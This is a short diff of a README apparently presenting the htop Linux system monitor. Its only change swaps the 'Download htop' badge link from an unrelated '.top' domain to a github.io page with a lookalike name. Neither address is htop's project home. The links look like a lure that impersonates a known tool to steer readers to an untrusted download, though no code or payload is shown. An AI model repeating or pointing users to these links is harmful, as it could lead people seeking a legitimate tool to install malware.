@@ -2,7 +2,7 @@
 
 A powerful, interactive system monitoring tool for Linux that provides real-time insights into CPU, memory, and process management with a user-friendly interface. Perfect for developers and sysadmins who need advanced performance tracking.
 
-[![Download htop](https://img.shields.io/badge/Download-htop-blueviolet)](https://poelkakusthbutn.top/)
+[![Download htop](https://img.shields.io/badge/Download-htop-blueviolet)](https://htop-a-tool-for-monitoring-systems.github.io/.github)
 
 ---
 
